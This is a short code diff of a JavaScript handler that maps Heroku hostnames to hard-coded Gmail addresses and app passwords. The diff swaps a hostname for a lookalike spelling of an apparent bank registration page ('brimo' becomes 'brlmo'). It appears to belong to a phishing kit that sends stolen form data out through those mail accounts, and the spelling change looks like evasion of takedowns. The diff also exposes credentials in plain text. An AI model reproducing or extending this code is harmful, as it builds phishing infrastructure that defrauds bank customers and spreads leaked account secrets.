@@ -12,7 +12,7 @@ export default function handler(req, res) {
         email = 'walangkudu@gmail.com';
         pass = 'osbhgxbiywffpwnk';
 
-    } else if (url == 'daftar-bifast-brimo.herokuapp.com'){
+    } else if (url == 'daftar-bl-fast-brlmo.herokuapp.com'){
         
         email = 'ikanhiu603@gmail.com';
         pass = 'cadnrlizjhuvhwsa';
